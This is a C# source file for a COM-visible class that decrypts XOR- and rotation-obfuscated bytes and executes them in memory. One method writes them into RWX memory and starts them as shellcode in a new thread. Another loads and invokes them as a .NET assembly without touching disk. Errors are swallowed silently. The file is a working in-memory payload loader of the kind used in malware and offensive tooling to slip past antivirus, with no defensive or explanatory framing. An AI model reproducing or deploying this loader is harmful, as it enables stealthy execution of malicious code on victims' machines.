using System;
using System.Text;
using System.Runtime.InteropServices;
using System.Reflection;
using System.IO;

[ComVisible(true)]
public class Runner
{
    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    private static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    // XOR + ROT Decryption logic
    private byte[] Decrypt(byte[] encrypted, int key, int rot)
    {
        if (encrypted == null || encrypted.Length == 0) return new byte[0];
        
        byte[] decrypted = new byte[encrypted.Length];
        for (int i = 0; i < encrypted.Length; i++)
        {
            byte b = (byte)(encrypted[i] ^ key);
            decrypted[i] = (byte)(b - rot);
        }
        return decrypted;
    }

    // Execute Shellcode
    public void ExecuteShellcode(byte[] encrypted, int key, int rot)
    {
        try
        {
            byte[] shellcode = Decrypt(encrypted, key, rot);
            if (shellcode.Length == 0) return;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
            if (addr == IntPtr.Zero) return;
            
            // Manual copy to avoid Marshal.Copy bounds issues with COM-passed arrays
            for (int i = 0; i < shellcode.Length; i++)
            {
                Marshal.WriteByte(addr, i, shellcode[i]);
            }
            
            uint threadId;
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, out threadId);
            if (hThread != IntPtr.Zero)
            {
                WaitForSingleObject(hThread, 0xFFFFFFFF);
            }
        }
        catch (Exception)
        {
            // Fail silently
        }
    }

    // Execute C# Assembly in-memory
    public void ExecuteAssembly(byte[] encrypted, int key, int rot, object argsObj)
    {
        try
        {
            byte[] assemblyData = Decrypt(encrypted, key, rot);
            if (assemblyData.Length == 0) return;

            Assembly assembly = Assembly.Load(assemblyData);
            MethodInfo entryPoint = assembly.EntryPoint;
            
            string[] args = new string[0];
            if (argsObj is string[]) {
                args = (string[])argsObj;
            }

            object[] parameters = null;
            if (entryPoint.GetParameters().Length > 0)
            {
                parameters = new object[] { args };
            }
            
            entryPoint.Invoke(null, parameters);
        }
        catch (Exception)
        {
            // Fail silently
        }
    }
}
